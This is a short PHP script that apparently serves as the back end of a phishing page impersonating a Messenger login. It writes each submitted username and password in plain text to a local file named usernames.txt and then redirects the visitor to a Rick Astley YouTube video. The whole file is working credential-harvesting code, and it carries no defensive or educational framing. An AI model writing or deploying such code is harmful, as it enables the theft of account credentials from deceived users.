<?php

file_put_contents("usernames.txt", "Messenger Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley');
exit();
?>
